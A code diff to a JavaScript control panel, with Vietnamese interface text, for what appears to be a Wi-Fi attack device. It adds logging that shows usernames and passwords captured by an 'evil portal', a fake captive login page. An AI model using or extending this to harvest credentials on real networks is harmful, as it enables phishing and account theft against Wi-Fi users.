@@ -82,6 +82,7 @@
   };
   const LOG_TYPE_TEXT = {
     all: "Mọi loại", command: "Lệnh", state: "Trạng thái", protocol: "Giao thức", transport: "Kết nối",
+    capture: "Thu thập",
   };
 
   // ---- State ----
@@ -189,6 +190,25 @@
     state.log.push({ receivedAtIso: new Date().toISOString(), module: module || null, type, content: String(content) });
     if (state.log.length > MAX_LOG_EVENTS) state.log.splice(0, state.log.length - MAX_LOG_EVENTS);
     state.dirty = true;
+  }
+
+  // A captured evil-portal form POST is the operator's result, so it goes into
+  // the event log (and only there — the stream pane keeps showing the raw
+  // frame). The device already decoded the form fields, so the log shows the
+  // submitted username/password; the raw body is kept for fields this portal
+  // does not recognise.
+  function logPortalCapture(payload) {
+    if (!payload || typeof payload !== "object" || payload.kind !== "evil_portal") return;
+    if (!isUint32(payload.capture) || payload.capture === 0) return;
+    const index = isUint32(payload.captures) ? ` #${payload.captures}` : "";
+    const user = typeof payload.user === "string" ? payload.user : null;
+    const pass = typeof payload.pass === "string" ? payload.pass : null;
+    if (user === null && pass === null) {
+      logEvent("wifi", "capture", `Portal: lần${index} không có trường đăng nhập nhận dạng được`);
+      return;
+    }
+    logEvent("wifi", "capture",
+      `Portal${index}: ${user === null ? "(không có)" : user} / ${pass === null ? "(không có)" : pass}`);
   }
 
   // ---- Toasts ----
@@ -423,6 +443,7 @@
         frame.ticket !== status.actionTicket || frame.action !== status.activeAction ||
         (module.streamSequence !== 0 && ((frame.sequence - module.streamSequence) >>> 0) >= 0x80000000) ||
         frame.sequence === module.streamSequence) return;
+    if (frame.module === "wifi") logPortalCapture(frame.payload);
     module.stream = frame;
     module.streamSequence = frame.sequence;
     state.dirty = true;
@@ -1163,7 +1184,7 @@
     for (const id of MODULE_IDS) dom.logFilter.append(el("option", { value: id, text: MODULE_META[id].label }));
     dom.logFilter.addEventListener("change", () => { state.logFilter = dom.logFilter.value; state.dirty = true; render(); });
 
-    for (const type of ["all", "command", "state", "protocol", "transport"]) {
+    for (const type of ["all", "command", "state", "protocol", "transport", "capture"]) {
       dom.logType.append(el("option", { value: type, text: LOG_TYPE_TEXT[type] }));
     }
     dom.logType.addEventListener("change", () => { state.logType = dom.logType.value; state.dirty = true; render(); });
